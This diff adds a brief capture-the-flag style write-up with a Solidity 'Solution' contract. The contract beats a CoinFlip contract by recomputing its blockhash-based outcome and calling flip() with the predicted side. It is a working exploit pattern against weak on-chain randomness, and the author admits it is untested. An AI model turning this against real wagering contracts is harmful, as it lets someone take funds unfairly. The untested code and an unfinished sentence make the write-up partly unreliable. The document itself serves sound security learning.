@@ -1,0 +1,25 @@
+The coinflip contract relies on the block number to generate a random coin flip. This contract can be defeated by knowing the block in which it gets mined. To do that we simply create another contract (say Solution) to call Coinflip.flip() so both transactions(the call to Coinflip.flip() and execution of Coinflip.flip() itself). The solution contract will use the same calculation (as in Coinflip) to determine the outcome (true/false).
+
+** I was not able to test this contract due to Remix hanging on me for some reason
+
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.14;
+
+contract Solution
+{
+    address coinflipContract = 0x7EF2e0048f5bAeDe046f6BF797943daF4ED8CB47;
+    
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    function attack() public returns (bool)
+    {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+
+        (bool success, bytes memory returnBytes) = coinflipContract.call(abi.encodeWithSignature("flip(bool)", side));
+        require(success == true, "Call to Coinflip.flip() failed");
+
+        return abi.decode(returnBytes, (bool));
+    }
+}
